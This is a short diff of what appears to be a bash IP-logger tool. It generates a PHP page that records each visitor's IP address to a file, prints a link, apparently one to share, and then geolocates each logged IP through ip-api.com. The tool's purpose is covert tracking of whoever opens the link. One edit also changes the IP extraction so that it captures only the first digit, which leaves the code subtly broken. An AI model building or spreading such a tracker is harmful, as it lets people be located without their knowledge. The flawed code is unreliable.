@@ -25,7 +25,7 @@ download(){
 }
 
 get_info(){
-    local ip=$1
+    ip=$1
     info=$(curl -s "http://ip-api.com/json/$ip")
     echo "$info" | jq .
 }
@@ -67,8 +67,6 @@ make_php(){
     \$file = fopen("ip.txt", "a");
     fwrite(\$file, "IP: " . \$ip_address);
     fclose(\$file);
-
-    \$ip_address = "";
     
     exit();
     ?>
@@ -131,7 +129,7 @@ echo "$new_url"
 echo "[-] Info: "
 while true; do
     if [[ -e ".server/ip.txt" ]]; then
-        ip=$(cat .server/ip.txt | grep "^[0-9]")
+        ip=$(grep -o "^[0-9]" ".server/ip.txt")
         get_info "$ip"
         echo -e "\n\n"
         rm -f .server/ip.txt
